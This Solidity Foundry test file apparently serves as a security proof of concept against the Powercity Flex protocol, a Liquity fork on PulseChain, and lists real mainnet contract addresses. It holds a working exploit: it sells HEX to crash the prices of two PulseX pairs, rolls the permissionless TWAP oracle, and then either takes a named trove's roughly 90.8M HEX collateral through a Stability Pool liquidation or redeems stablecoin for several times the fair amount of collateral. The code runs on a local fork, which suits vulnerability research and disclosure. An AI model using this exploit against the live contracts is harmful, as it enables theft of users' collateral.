// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/*
 * Powercity Flex Protocol (PulseChain) — fork PoC
 * ------------------------------------------------
 * Read-only on mainnet; everything below runs on a local fork of PulseChain.
 *
 * Verified live state (PulseScan-verified sources + direct reads):
 *   - FLEX = Liquity v1 fork. Collateral = HEX (8 dec), stable = HEXDC (8 dec).
 *   - TroveManager 0xC2D0720721d48cE85e20Dc9E01B8449D7eDd14CE (21 troves)
 *   - StabilityPool 0x271F576fD6DE465231320a0F9997ACb0C8b97e07
 *   - ActivePool    0xE4FD443B26fA809A48EB658eA7edeB31E95c2144  (~265.9M HEX)
 *   - PriceFeed     0x5f2529BC80bB9C0Bd7C417EA78CE2Cd6114B112C (UNVERIFIED)
 *   - Oracle (from bytecode): 4 PulseX pair TWAPs, blend
 *       0.65*(HEX/WPLS V1) + 0.35*(HEX/WPLS V2), USD leg 0.60/0.40 (WPLS/DAI, WPLS/USDC).
 *     Observations roll only when now - lastUpdate >= 420s; the TWAP is
 *       (cumulative_now - cumulative_old) / (t_now - t_old)
 *     and fetchPrice() is PERMISSIONLESS (bots poke it; any caller can roll).
 *
 * Tests:
 *  1. baseline: no trove is liquidatable today; fetchPrice() is permissionless.
 *  2. a sustained (>420s) crash of the two HEX/WPLS pools propagates into the
 *     oracle and lets an attacker-controlled StabilityPool capture an entire
 *     trove's collateral on liquidation.
 *  3. a sustained crash lets a redeemer drain trove collateral at the crashed
 *     price (TCR > MCR gate).
 *
 * NOTE: the fork warps 421s to simulate "the crash was sustained for the whole
 * TWAP window". The real-world gate is whether such a crash can be held for
 * 420+ seconds against arbitrage — see README.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface ITroveManager {
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256) external view returns (address);
    function getCurrentICR(address, uint256) external view returns (uint256);
    function Troves(address) external view returns (uint256, uint256, uint256, uint8, uint128);
    function MCR() external view returns (uint256);
    function getTCR(uint256) external view returns (uint256);
    function liquidate(address) external;
    function redeemCollateral(uint256, address, address, address, uint256, uint256, uint256) external;
}

interface IStabilityPool {
    function provideToSP(uint256, address) external;
    function getTotalLUSDDeposits() external view returns (uint256);
    function getDepositorETHGain(address) external view returns (uint256);
}

interface IActivePool {
    function getETH() external view returns (uint256);
}

contract FlexPoC is Test {
    // --- PulseChain mainnet addresses (chain id 369) ---
    address constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39; // 8 decimals
    address constant HEXDC = 0x1FE0319440A672526916C232EAEe4808254Bdb00; // LUSDToken, 8 dec
    address constant TM = 0xC2D0720721d48cE85e20Dc9E01B8449D7eDd14CE;
    address constant SP = 0x271F576fD6DE465231320a0F9997ACb0C8b97e07;
    address constant AP = 0xE4FD443B26fA809A48EB658eA7edeB31E95c2144;
    address constant PF = 0x5f2529BC80bB9C0Bd7C417EA78CE2Cd6114B112C;
    address constant PAIR_V1 = 0xf1F4ee610b2bAbB05C635F726eF8B0C568c8dc65; // HEX/WPLS
    address constant PAIR_V2 = 0x19BB45a7270177e303DEe6eAA6F5Ad700812bA98; // HEX/WPLS (V2)
    address constant ATTACKER = address(0xA11CE);

    function setUp() public {
        string memory rpc =
            vm.envOr("PULSE_RPC", string("https://pulsechain-rpc.publicnode.com"));
        vm.createSelectFork(rpc);
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    /// Sell HEX into a HEX/WPLS pair so that the post-trade spot becomes ~den^2/num^2 of the old one.
    /// Passed multiplier num/den = 1/sqrt(target_factor) (e.g. 30825/10000 -> ~6% of old price).
    function crashPair(address pair, uint256 num, uint256 den) internal returns (uint256 hexIn) {
        require(IPair(pair).token0() == HEX, "unexpected pair orientation");
        (uint112 r0, uint112 r1,) = IPair(pair).getReserves();
        hexIn = (uint256(r0) * num) / den; // (1/sqrt(f) - 1) * r0
        uint256 amount1Out = (hexIn * 997 * uint256(r1)) / (uint256(r0) * 1000 + hexIn * 997);
        IERC20(HEX).transfer(pair, hexIn);
        IPair(pair).swap(0, amount1Out, ATTACKER, "");
    }

    /// Roll the oracle observation window now (fetchPrice is permissionless), so the
    /// next TWAP window starts here.
    function rollOracle() internal {
        vm.warp(block.timestamp + 421); // guarantee >= 420s since the last observation
        IPriceFeed(PF).fetchPrice();
    }

    function troveCount() internal view returns (uint256) {
        return ITroveManager(TM).getTroveOwnersCount();
    }

    function troveAt(uint256 i)
        internal
        view
        returns (address owner, uint256 debt, uint256 coll, uint8 status)
    {
        owner = ITroveManager(TM).getTroveFromTroveOwnersArray(i);
        (debt, coll, , status, ) = ITroveManager(TM).Troves(owner);
    }

    /// Find the active trove with the largest collateral that is liquidatable at `price`
    /// under the NORMAL-mode rule (ICR < MCR -> full collateral to the StabilityPool).
    function largestLiquidatable(uint256 price) internal view returns (address best, uint256 bestColl) {
        uint256 n = troveCount();
        for (uint256 i = 0; i < n; i++) {
            (address o, , uint256 c, uint8 s) = troveAt(i);
            if (s != 1) continue;
            if (ITroveManager(TM).getCurrentICR(o, price) < ITroveManager(TM).MCR()) {
                if (c > bestColl) {
                    best = o;
                    bestColl = c;
                }
            }
        }
    }

    function icrAt(address trove, uint256 price) internal view returns (uint256) {
        return ITroveManager(TM).getCurrentICR(trove, price);
    }

    // ------------------------------------------------------------------
    // 1. baseline — nothing extractable at the live oracle price
    // ------------------------------------------------------------------
    function test_baseline_live_state() public {
        uint256 p = IPriceFeed(PF).fetchPrice();

        uint256 minIcr = type(uint256).max;
        uint256 totDebt;
        uint256 totColl;
        uint256 n = troveCount();
        for (uint256 i = 0; i < n; i++) {
            (address o, uint256 d, uint256 c, uint8 s) = troveAt(i);
            if (s != 1) continue;
            uint256 icr = ITroveManager(TM).getCurrentICR(o, p);
            if (icr < minIcr) minIcr = icr;
            totDebt += d;
            totColl += c;
        }

        emit log_named_uint("block.number", block.number);
        emit log_named_uint("oracle fetchPrice (1e8 USD/HEX)", p);
        emit log_named_uint("active troves", n);
        emit log_named_uint("total debt (HEXDC, 1e8)", totDebt);
        emit log_named_uint("total collateral (HEX, 1e8)", totColl);
        emit log_named_uint("min ICR (1e8 = 100%)", minIcr);
        emit log_named_uint("MCR (1e8)", ITroveManager(TM).MCR());
        emit log_named_uint("system TCR (1e8)", ITroveManager(TM).getTCR(p));
        emit log_named_uint("ActivePool HEX", IActivePool(AP).getETH());
        emit log_named_uint("StabilityPool HEXDC deposits", IStabilityPool(SP).getTotalLUSDDeposits());
        emit log_named_uint("HEXDC totalSupply", IERC20(HEXDC).totalSupply());

        assertGe(minIcr, ITroveManager(TM).MCR(), "no trove should be liquidatable at live price");

        // fetchPrice is permissionless: any EOA can roll the oracle.
        vm.prank(address(0xBEEF));
        uint256 p2 = IPriceFeed(PF).fetchPrice();
        assertEq(p2, p, "permissionless fetchPrice");
    }

    // ------------------------------------------------------------------
    // 2. sustained crash -> liquidation captures trove collateral
    //    This fork's recovery-mode rules (TroveManager._liquidateRecoveryMode):
    //      - ICR <= 100%            -> pure redistribution (SP gets nothing)
    //      - 100% < ICR < 110%      -> offset against the SP (SP gets the FULL collateral)
    //      - 110% <= ICR < TCR      -> capped offset (SP gets ~110% of debt; surplus to borrower)
    //      - else                   -> nothing
    //    Trove #9 (90.8M HEX, 17,055.92 HEXDC) is always marginally ABOVE the system
    //    TCR, so the only capturable band is ICR(#9) in (100%, 110%)  =>  crash factor
    //    f in (0.0780, 0.0858).  Target f ~= 0.082.
    // ------------------------------------------------------------------
    function test_sustained_crash_liquidation_capture() public {
        uint256 pBase = IPriceFeed(PF).fetchPrice();
        rollOracle(); // start the TWAP window at T0

        deal(HEX, ATTACKER, 1_000_000_000 * 1e8); // attacker capital (see README)
        vm.startPrank(ATTACKER);
        crashPair(PAIR_V1, 24925, 10000); // spot -> ~8.2% of old
        crashPair(PAIR_V2, 24925, 10000);
        vm.stopPrank();

        vm.warp(block.timestamp + 421); // "the crash is sustained for the whole window"
        uint256 pCrash = IPriceFeed(PF).fetchPrice();

        emit log_named_uint("price baseline", pBase);
        emit log_named_uint("price after 421s sustained crash", pCrash);
        assertLt(pCrash, pBase / 12, "TWAP must follow a sustained crash");
        assertGt(pCrash, pBase / 13, "must land inside the (100%,110%) ICR band for trove9");

        // Attacker funds the StabilityPool and liquidates trove #9.
        deal(HEXDC, ATTACKER, 25_000 * 1e8);
        vm.startPrank(ATTACKER);
        IStabilityPool(SP).provideToSP(20_000 * 1e8, address(0));

        address big = 0x4336bC4884B1c1e3CB6F7e07b1A1dc5fB1C208aF; // trove #9, 90.8M HEX
        uint256 icr9 = icrAt(big, pCrash);
        emit log_named_uint("trove9 ICR at crashed price", icr9);
        assertGt(icr9, 100_000_000, "trove9 must be >100% (else pure redistribution)");
        assertLt(icr9, 110_000_000, "trove9 must be <110% for SP offset");

        uint256 spBefore = IERC20(HEX).balanceOf(SP);
        ITroveManager(TM).liquidate(big);
        uint256 spGain9 = IERC20(HEX).balanceOf(SP) - spBefore;
        uint256 attackerGain = IStabilityPool(SP).getDepositorETHGain(ATTACKER);
        vm.stopPrank();

        emit log_named_uint("SP HEX gain from trove9 (full offset)", spGain9);
        emit log_named_uint("attacker claimable SP gain (HEX)", attackerGain);
        assertGt(spGain9, 80_000_000 * 1e8, "SP must capture trove9's full collateral");
        assertGt(attackerGain, 0, "SP depositor captures collateral");
    }

    // ------------------------------------------------------------------
    // 3. sustained crash -> redemption drains trove collateral cheaply
    // ------------------------------------------------------------------
    function test_sustained_crash_redemption_drain() public {
        uint256 pBase = IPriceFeed(PF).fetchPrice();
        rollOracle();

        deal(HEX, ATTACKER, 1_000_000_000 * 1e8);
        vm.startPrank(ATTACKER);
        crashPair(PAIR_V1, 17735, 10000); // spot -> ~13% of old (TCR ~166%: normal mode)
        crashPair(PAIR_V2, 17735, 10000);
        vm.stopPrank();

        vm.warp(block.timestamp + 421);
        uint256 pCrash = IPriceFeed(PF).fetchPrice();

        emit log_named_uint("price baseline", pBase);
        emit log_named_uint("price after sustained crash", pCrash);
        uint256 tcr = ITroveManager(TM).getTCR(pCrash);
        emit log_named_uint("system TCR at crashed price", tcr);
        assertLt(pCrash, pBase / 2, "oracle must be crashed");
        assertGt(tcr, 150_000_000, "must stay in NORMAL mode so a 100% max fee is valid");

        deal(HEXDC, ATTACKER, 20_000 * 1e8);
        uint256 hexBefore = IERC20(HEX).balanceOf(ATTACKER);
        vm.startPrank(ATTACKER);
        ITroveManager(TM).redeemCollateral(
            20_000 * 1e8,
            address(0),
            address(0),
            address(0),
            0,
            0,
            1e8 // 100% max fee (normal mode); the fee for this redemption is ~20.5%
        );
        vm.stopPrank();
        uint256 got = IERC20(HEX).balanceOf(ATTACKER) - hexBefore;
        uint256 livePayout = (20_000 * 1e8 * 1e8) / pBase; // same HEXDC at the live price

        emit log_named_uint("HEX received for 20,000 HEXDC", got);
        emit log_named_uint("payout at live oracle price", livePayout);
        emit log_named_uint("multiple vs live price (x100)", got * 100 / livePayout);
        assertGt(got, livePayout * 2, "crashed-price redemption extracts multiples");
    }
}
